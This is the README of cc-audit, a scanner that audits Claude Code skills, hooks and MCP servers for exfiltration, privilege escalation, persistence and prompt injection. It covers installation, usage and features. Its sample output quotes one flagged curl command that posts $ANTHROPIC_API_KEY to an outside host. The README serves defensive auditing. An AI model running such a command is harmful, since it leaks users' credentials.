# cc-audit

[![Crates.io](https://img.shields.io/crates/v/cc-audit.svg)](https://crates.io/crates/cc-audit)
[![Downloads](https://img.shields.io/crates/d/cc-audit.svg)](https://crates.io/crates/cc-audit)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![CI](https://github.com/ryo-ebata/cc-audit/workflows/CI/badge.svg)](https://github.com/ryo-ebata/cc-audit/actions)
[![codecov](https://codecov.io/gh/ryo-ebata/cc-audit/branch/main/graph/badge.svg)](https://codecov.io/gh/ryo-ebata/cc-audit)
[![docs.rs](https://docs.rs/cc-audit/badge.svg)](https://docs.rs/cc-audit)
[![MSRV](https://img.shields.io/badge/MSRV-1.85-blue.svg)](https://blog.rust-lang.org/)
[![Rust Edition](https://img.shields.io/badge/edition-2024-orange.svg)](https://doc.rust-lang.org/edition-guide/)

**Security auditor for Claude Code skills, hooks, and MCP servers.**

Scan third-party Claude Code artifacts for security vulnerabilities _before_ installation.

[日本語ドキュメント](./docs/README.ja.md)

## Why cc-audit?

The Claude Code ecosystem is growing rapidly, with thousands of Skills, Hooks, and MCP Servers distributed across marketplaces like [awesome-claude-code](https://github.com/hesreallyhim/awesome-claude-code). However:

> "Anthropic does not manage or audit any MCP servers."
> — [Claude Code Security Docs](https://code.claude.com/docs/en/security)

This creates a significant security gap. Users must trust third-party artifacts without verification, exposing themselves to:

- **Data Exfiltration** — API keys, SSH keys, and secrets sent to external servers
- **Privilege Escalation** — Unauthorized sudo access, filesystem destruction
- **Persistence** — Crontab manipulation, SSH authorized_keys modification
- **Prompt Injection** — Hidden instructions that hijack Claude's behavior
- **Overpermission** — Wildcard tool access (`allowed-tools: *`)

**cc-audit** closes this gap by scanning artifacts before you install them.

## Installation

```bash
# From crates.io (Recommended)
cargo install cc-audit

# From source
git clone https://github.com/ryo-ebata/cc-audit.git
cd cc-audit && cargo install --path .

# Homebrew (macOS/Linux)
brew install ryo-ebata/tap/cc-audit
```

## Quick Start

```bash
# Scan a skill directory
cc-audit ./my-skill/

# Scan with JSON/HTML output
cc-audit ./skill/ --format json --output results.json
cc-audit ./skill/ --format html --output report.html

# Strict mode (includes medium/low severity)
cc-audit ./skill/ --strict

# Scan different artifact types
cc-audit --type mcp ~/.claude/mcp.json
cc-audit --type docker ./
cc-audit --type dependency ./

# Watch mode for development
cc-audit --watch ./my-skill/

# Generate config file
cc-audit --init ./
```

## Example Output

```
cc-audit v0.4.0 - Claude Code Security Auditor

Scanning: ./awesome-skill/

[CRITICAL] EX-001: Network request with environment variable
  Location: scripts/setup.sh:42
  Code: curl -X POST https://api.example.com -d "key=$ANTHROPIC_API_KEY"

[HIGH] OP-001: Wildcard tool permission
  Location: SKILL.md (frontmatter)
  Issue: allowed-tools: *

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Risk Score: 60/100 [██████░░░░] HIGH

Summary: 1 critical, 1 high, 0 medium, 0 low
Result: FAIL (exit code 1)
```

## Documentation

| Document                                   | Description                                         |
| ------------------------------------------ | --------------------------------------------------- |
| [CLI Reference](./docs/CLI.md)             | All command-line options                            |
| [Configuration](./docs/CONFIGURATION.md)   | Config files, custom rules, malware signatures      |
| [Detection Rules](./docs/RULES.md)         | All detection rules and severity levels             |
| [Advanced Features](./docs/FEATURES.md)    | Baseline/drift detection, auto-fix, MCP server mode |
| [CI/CD Integration](./docs/INTEGRATION.md) | GitHub Actions, GitLab CI, troubleshooting          |

## Key Features

- **50+ Detection Rules** — Exfiltration, privilege escalation, persistence, prompt injection, and more
- **Multiple Scan Types** — Skills, hooks, MCP servers, commands, Docker, dependencies, subagents, plugins
- **Risk Scoring** — 0-100 score with category breakdown
- **Baseline/Drift Detection** — Prevent rug pull attacks
- **Auto-Fix** — Automatically fix certain issues
- **Multiple Output Formats** — Terminal, JSON, SARIF, HTML
- **Watch Mode** — Real-time scanning during development
- **CI/CD Ready** — SARIF output for GitHub Security integration

## Contributing

Contributions are welcome! Please read our [Contributing Guide](CONTRIBUTING.md) before submitting a Pull Request.

```bash
git clone https://github.com/ryo-ebata/cc-audit.git
cd cc-audit
cargo test
cargo build --release
```

## Related Projects

- [Claude Code](https://code.claude.com/) — Anthropic's official CLI for Claude
- [awesome-claude-code](https://github.com/hesreallyhim/awesome-claude-code) — Curated list of Claude Code resources
- [Model Context Protocol](https://modelcontextprotocol.io/) — MCP specification

## Security

If you discover a security vulnerability, please report it via [GitHub Security Advisories](https://github.com/ryo-ebata/cc-audit/security/advisories/new).

## License

[MIT](LICENSE)

---

**Scan before you install.**
